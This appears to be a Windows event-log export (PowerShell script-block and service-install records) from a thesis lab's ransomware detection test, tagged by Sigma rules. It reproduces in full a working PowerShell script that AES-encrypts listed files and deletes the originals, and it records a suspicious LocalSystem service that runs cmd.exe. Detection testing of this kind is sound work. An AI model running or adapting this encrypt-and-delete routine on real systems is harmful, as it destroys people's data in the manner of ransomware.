{"Timestamp":"2026-07-12T13:27:32.068265676Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"medium","Title":"Potentially Malicious PwSh","RecordID":3275096,"Details":"ScriptBlock: param(\n    [string]$WorkDir = \"\",\n    [string]$ListFile = \"\",\n    [string]$PasswordFile = \"\",\n    [int]$MaxFiles = 25\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($ListFile)) {\n    $ListFile = Join-Path $PSScriptRoot \"lista_archivos.csv\"\n}\nif ([string]::IsNullOrWhiteSpace($PasswordFile)) {\n    $PasswordFile = Join-Path $PSScriptRoot \"password.txt\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\nif (-not (Test-Path -LiteralPath $ListFile)) {\n    throw \"ListFile does not exist: $ListFile\"\n}\nif (-not (Test-Path -LiteralPath $PasswordFile)) {\n    Set-Content -LiteralPath $PasswordFile -Value \"TFM-Controlled-AES-Key-Only-Dummy-Lab\" -Encoding UTF8\n}\n\n$password = (Get-Content -LiteralPath $PasswordFile -Raw).Trim()\n$sha = [System.Security.Cryptography.SHA256]::Create()\n$key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))\n\nfunction Protect-DummyFile {\n    param(\n        [Parameter(Mandatory=$true)][string]$Path,\n        [Parameter(Mandatory=$true)][byte[]]$Key\n    )\n\n    $aes = [System.Security.Cryptography.Aes]::Create()\n    $aes.Key = $Key\n    $aes.GenerateIV()\n    $outPath = \"$Path.aes\"\n\n    $plainBytes = [System.IO.File]::ReadAllBytes($Path)\n    $outStream = [System.IO.File]::Create($outPath)\n    try {\n        $outStream.Write($aes.IV, 0, $aes.IV.Length)\n        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream(\n            $outStream,\n            $aes.CreateEncryptor(),\n            [System.Security.Cryptography.CryptoStreamMode]::Write\n        )\n        try {\n            $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)\n            $cryptoStream.FlushFinalBlock()\n        }\n        finally {\n            $cryptoStream.Dispose()\n        }\n    }\n    finally {\n        $outStream.Dispose()\n        $aes.Dispose()\n    }\n\n    Remove-Item -LiteralPath $Path -Force\n    return $outPath\n}\n\nWrite-Host \"=== INICIANDO PRUEBA TFM TEC-007 ===\"\nWrite-Host \"WorkDir: $WorkDir\"\nWrite-Host \"ListFile: $ListFile\"\n\n$rows = @(Import-Csv -LiteralPath $ListFile)\n$targets = @(\n    $rows |\n    Where-Object {\n        $_.FullName -and\n        ($_.FullName -like \"$WorkDir*\") -and\n        (Test-Path -LiteralPath $_.FullName) -and\n        ($_.FullName -notlike \"*.aes\")\n    } |\n    Select-Object -First $MaxFiles\n)\n\n$encrypted = New-Object System.Collections.Generic.List[string]\nforeach ($row in $targets) {\n    $encrypted.Add((Protect-DummyFile -Path $row.FullName -Key $key)) | Out-Null\n}\n\nWrite-Host \"AES encrypted files: $($encrypted.Count)\"\nforeach ($path in ($encrypted | Select-Object -First 10)) {\n    Write-Host \"AES evidence: $path\"\n}\n\nif ($encrypted.Count -lt 1) {\n    throw \"No files encrypted. Review DUMB_LAB and lista_archivos.csv.\"\n}\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862852.0682657},"EventRecordID":3275096,"Correlation":{"ActivityID":"F2694954-11F0-0001-95EC-6EF2F011DD01"},"Execution":{"ProcessID":132,"ThreadID":2828},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"param(\n    [string]$WorkDir = \"\",\n    [string]$ListFile = \"\",\n    [string]$PasswordFile = \"\",\n    [int]$MaxFiles = 25\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($ListFile)) {\n    $ListFile = Join-Path $PSScriptRoot \"lista_archivos.csv\"\n}\nif ([string]::IsNullOrWhiteSpace($PasswordFile)) {\n    $PasswordFile = Join-Path $PSScriptRoot \"password.txt\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\nif (-not (Test-Path -LiteralPath $ListFile)) {\n    throw \"ListFile does not exist: $ListFile\"\n}\nif (-not (Test-Path -LiteralPath $PasswordFile)) {\n    Set-Content -LiteralPath $PasswordFile -Value \"TFM-Controlled-AES-Key-Only-Dummy-Lab\" -Encoding UTF8\n}\n\n$password = (Get-Content -LiteralPath $PasswordFile -Raw).Trim()\n$sha = [System.Security.Cryptography.SHA256]::Create()\n$key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))\n\nfunction Protect-DummyFile {\n    param(\n        [Parameter(Mandatory=$true)][string]$Path,\n        [Parameter(Mandatory=$true)][byte[]]$Key\n    )\n\n    $aes = [System.Security.Cryptography.Aes]::Create()\n    $aes.Key = $Key\n    $aes.GenerateIV()\n    $outPath = \"$Path.aes\"\n\n    $plainBytes = [System.IO.File]::ReadAllBytes($Path)\n    $outStream = [System.IO.File]::Create($outPath)\n    try {\n        $outStream.Write($aes.IV, 0, $aes.IV.Length)\n        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream(\n            $outStream,\n            $aes.CreateEncryptor(),\n            [System.Security.Cryptography.CryptoStreamMode]::Write\n        )\n        try {\n            $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)\n            $cryptoStream.FlushFinalBlock()\n        }\n        finally {\n            $cryptoStream.Dispose()\n        }\n    }\n    finally {\n        $outStream.Dispose()\n        $aes.Dispose()\n    }\n\n    Remove-Item -LiteralPath $Path -Force\n    return $outPath\n}\n\nWrite-Host \"=== INICIANDO PRUEBA TFM TEC-007 ===\"\nWrite-Host \"WorkDir: $WorkDir\"\nWrite-Host \"ListFile: $ListFile\"\n\n$rows = @(Import-Csv -LiteralPath $ListFile)\n$targets = @(\n    $rows |\n    Where-Object {\n        $_.FullName -and\n        ($_.FullName -like \"$WorkDir*\") -and\n        (Test-Path -LiteralPath $_.FullName) -and\n        ($_.FullName -notlike \"*.aes\")\n    } |\n    Select-Object -First $MaxFiles\n)\n\n$encrypted = New-Object System.Collections.Generic.List[string]\nforeach ($row in $targets) {\n    $encrypted.Add((Protect-DummyFile -Path $row.FullName -Key $key)) | Out-Null\n}\n\nWrite-Host \"AES encrypted files: $($encrypted.Count)\"\nforeach ($path in ($encrypted | Select-Object -First 10)) {\n    Write-Host \"AES evidence: $path\"\n}\n\nif ($encrypted.Count -lt 1) {\n    throw \"No files encrypted. Review DUMB_LAB and lista_archivos.csv.\"\n}\n","ScriptBlockId":"9ca817bd-e258-41a4-9a43-c18b773a1a94","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\nparam(\n    [string]$WorkDir = \"\",\n    [string]$ListFile = \"\",\n    [string]$PasswordFile = \"\",\n    [int]$MaxFiles = 25\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($ListFile)) {\n    $ListFile = Join-Path $PSScriptRoot \"lista_archivos.csv\"\n}\nif ([string]::IsNullOrWhiteSpace($PasswordFile)) {\n    $PasswordFile = Join-Path $PSScriptRoot \"password.txt\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\nif (-not (Test-Path -LiteralPath $ListFile)) {\n    throw \"ListFile does not exist: $ListFile\"\n}\nif (-not (Test-Path -LiteralPath $PasswordFile)) {\n    Set-Content -LiteralPath $PasswordFile -Value \"TFM-Controlled-AES-Key-Only-Dummy-Lab\" -Encoding UTF8\n}\n\n$password = (Get-Content -LiteralPath $PasswordFile -Raw).Trim()\n$sha = [System.Security.Cryptography.SHA256]::Create()\n$key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))\n\nfunction Protect-DummyFile {\n    param(\n        [Parameter(Mandatory=$true)][string]$Path,\n        [Parameter(Mandatory=$true)][byte[]]$Key\n    )\n\n    $aes = [System.Security.Cryptography.Aes]::Create()\n    $aes.Key = $Key\n    $aes.GenerateIV()\n    $outPath = \"$Path.aes\"\n\n    $plainBytes = [System.IO.File]::ReadAllBytes($Path)\n    $outStream = [System.IO.File]::Create($outPath)\n    try {\n        $outStream.Write($aes.IV, 0, $aes.IV.Length)\n        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream(\n            $outStream,\n            $aes.CreateEncryptor(),\n            [System.Security.Cryptography.CryptoStreamMode]::Write\n        )\n        try {\n            $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)\n            $cryptoStream.FlushFinalBlock()\n        }\n        finally {\n            $cryptoStream.Dispose()\n        }\n    }\n    finally {\n        $outStream.Dispose()\n        $aes.Dispose()\n    }\n\n    Remove-Item -LiteralPath $Path -Force\n    return $outPath\n}\n\nWrite-Host \"=== INICIANDO PRUEBA TFM TEC-007 ===\"\nWrite-Host \"WorkDir: $WorkDir\"\nWrite-Host \"ListFile: $ListFile\"\n\n$rows = @(Import-Csv -LiteralPath $ListFile)\n$targets = @(\n    $rows |\n    Where-Object {\n        $_.FullName -and\n        ($_.FullName -like \"$WorkDir*\") -and\n        (Test-Path -LiteralPath $_.FullName) -and\n        ($_.FullName -notlike \"*.aes\")\n    } |\n    Select-Object -First $MaxFiles\n)\n\n$encrypted = New-Object System.Collections.Generic.List[string]\nforeach ($row in $targets) {\n    $encrypted.Add((Protect-DummyFile -Path $row.FullName -Key $key)) | Out-Null\n}\n\nWrite-Host \"AES encrypted files: $($encrypted.Count)\"\nforeach ($path in ($encrypted | Select-Object -First 10)) {\n    Write-Host \"AES evidence: $path\"\n}\n\nif ($encrypted.Count -lt 1) {\n    throw \"No files encrypted. Review DUMB_LAB and lista_archivos.csv.\"\n}\n\n\nId. de bloque de script: 9ca817bd-e258-41a4-9a43-c18b773a1a94\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:32.219824075Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3275104,"Details":"ScriptBlock: {\n        $_.FullName -and\n        ($_.FullName -like \"$WorkDir*\") -and\n        (Test-Path -LiteralPath $_.FullName) -and\n        ($_.FullName -notlike \"*.aes\")\n    }","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862852.219824},"EventRecordID":3275104,"Correlation":{"ActivityID":"F2694954-11F0-0000-06EC-6BF2F011DD01"},"Execution":{"ProcessID":132,"ThreadID":2828},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{\n        $_.FullName -and\n        ($_.FullName -like \"$WorkDir*\") -and\n        (Test-Path -LiteralPath $_.FullName) -and\n        ($_.FullName -notlike \"*.aes\")\n    }","ScriptBlockId":"a55b195b-f662-4666-9706-6de1f7b26607","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n{\n        $_.FullName -and\n        ($_.FullName -like \"$WorkDir*\") -and\n        (Test-Path -LiteralPath $_.FullName) -and\n        ($_.FullName -notlike \"*.aes\")\n    }\n\nId. de bloque de script: a55b195b-f662-4666-9706-6de1f7b26607\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:32.413793563Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3275158,"Details":"ScriptBlock: $global:?","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862852.4137936},"EventRecordID":3275158,"Correlation":{"ActivityID":"F2694954-11F0-0002-33BB-6EF2F011DD01"},"Execution":{"ProcessID":132,"ThreadID":2828},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$global:?","ScriptBlockId":"9587bc80-c8ac-42c8-bfab-41b8a322c381","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\n$global:?\n\nId. de bloque de script: 9587bc80-c8ac-42c8-bfab-41b8a322c381\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:34.766040086Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3275231,"Details":"ScriptBlock: $Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862854.76604},"EventRecordID":3275231,"Correlation":{"ActivityID":"F2694954-11F0-0002-F1BB-6EF2F011DD01"},"Execution":{"ProcessID":316,"ThreadID":9060},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"","ScriptBlockId":"5564b06f-1002-4cc4-b686-5b7c0f30f25e","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n$Root = 'C:\\Users\\seguridad\\Desktop\\TFM\\Pruebas\\DUMB_LAB'\r\n\r\n$Folders = @(\r\n  'Finance',\r\n  'HR',\r\n  'Legal',\r\n  'Projects',\r\n  'Projects\\2026',\r\n  'Projects\\2025',\r\n  'Shared',\r\n  'Engineering',\r\n  'Backups'\r\n)\r\n\r\n$Exts = @('.docx','.xlsx','.pdf','.txt','.csv','.pptx','.jpg')\r\n\r\n$Names = @(\r\n  'Nominas_Q1_2026',\r\n  'Propuesta_Cliente',\r\n  'Contrato_Proveedor',\r\n  'Inventario',\r\n  'Backup_Resumen',\r\n  'Roadmap_Interno',\r\n  'Presupuesto',\r\n  'Plan_Proyecto',\r\n  'Acta_Reunion',\r\n  'Informe_Final'\r\n)\r\n\r\n# marcador de seguridad\r\nSet-Content \"$Root\\LAB_OK_DO_NOT_TOUCH.txt\" 'TFM TEC-007 SAFE LAB'\r\n\r\n# crear subcarpetas\r\nforeach ($f in $Folders) {\r\n  New-Item -ItemType Directory -Path (Join-Path $Root $f) -Force | Out-Null\r\n}\r\n\r\n# crear 1500 ficheros dummy\r\n1..1500 | ForEach-Object {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\r\n\r\nWrite-Host \"OK. Dataset dummy creado en $Root\"\n\nId. de bloque de script: 5564b06f-1002-4cc4-b686-5b7c0f30f25e\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:27:34.861608028Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3275235,"Details":"ScriptBlock: {\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862854.861608},"EventRecordID":3275235,"Correlation":{"ActivityID":"F2694954-11F0-0003-60DF-6EF2F011DD01"},"Execution":{"ProcessID":316,"ThreadID":9060},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}","ScriptBlockId":"3d1c3f51-66b8-4a20-b429-30f428f14db0","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n{\r\n  $folder = Get-Random $Folders\r\n  $name   = Get-Random $Names\r\n  $ext    = Get-Random $Exts\r\n  $file   = Join-Path (Join-Path $Root $folder) (\"{0}_{1}{2}\" -f $name, $_, $ext)\r\n\r\n  @\"\r\nDummy file for TEC-007\r\nId: $_\r\nCreated: $(Get-Date)\r\nThis is safe lab content only\r\n\"@ | Set-Content -Path $file -Encoding UTF8\r\n}\n\nId. de bloque de script: 3d1c3f51-66b8-4a20-b429-30f428f14db0\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:22:26.509283304Z","Computer":"LT29.ait.us.es","Channel":"System","EID":7045,"Level":"informational","Title":"Svc Installed 2","RecordID":53980,"Details":"Svc: lygsuajn ¦ Path: C:\\Windows\\system32\\drivers\\lygsuajn.sys ¦ Acct:  ¦ StartType: inicio del sistema","_Event":{"System":{"Provider":{"Name":"Service Control Manager","Guid":"{555908d1-a6d7-4695-8e1e-26931d2012f4}","EventSourceName":"Service Control Manager"},"EventID":{"Qualifiers":16384,"Value":7045},"Version":0,"Level":4,"Task":0,"Opcode":0,"Keywords":9259400833873739776,"TimeCreated":{"SystemTime":1783862546.5092833},"EventRecordID":53980,"Correlation":{},"Execution":{"ProcessID":772,"ThreadID":11536},"Channel":"System","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-18"}},"EventData":{"ServiceName":"lygsuajn","ImagePath":"C:\\Windows\\system32\\drivers\\lygsuajn.sys","ServiceType":"controlador de modo kernel","StartType":"inicio del sistema","AccountName":""},"Message":"Se instaló un servicio en el sistema.\n\nNombre del servicio:  lygsuajn\nNombre del archivo del servicio:  C:\\Windows\\system32\\drivers\\lygsuajn.sys\nTipo de servicio:  controlador de modo kernel\nTipo de inicio de servicio:  inicio del sistema\nCuenta de servicio:  \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
{"Timestamp":"2026-07-12T13:26:59.778740882Z","Computer":"LT29.ait.us.es","Channel":"System","EID":7045,"Level":"high","Title":"Suspicious Service Path","RecordID":53981,"Details":"Svc: TFM TEC005 Test Service ¦ Path: C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt","_Event":{"System":{"Provider":{"Name":"Service Control Manager","Guid":"{555908d1-a6d7-4695-8e1e-26931d2012f4}","EventSourceName":"Service Control Manager"},"EventID":{"Qualifiers":16384,"Value":7045},"Version":0,"Level":4,"Task":0,"Opcode":0,"Keywords":9259400833873739776,"TimeCreated":{"SystemTime":1783862819.778741},"EventRecordID":53981,"Correlation":{},"Execution":{"ProcessID":772,"ThreadID":11536},"Channel":"System","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"ServiceName":"TFM TEC005 Test Service","ImagePath":"C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt","ServiceType":"servicio de modo usuario","StartType":"inicio por solicitud","AccountName":"LocalSystem"},"Message":"Se instaló un servicio en el sistema.\n\nNombre del servicio:  TFM TEC005 Test Service\nNombre del archivo del servicio:  C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt\nTipo de servicio:  servicio de modo usuario\nTipo de inicio de servicio:  inicio por solicitud\nCuenta de servicio:  LocalSystem\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863026787}
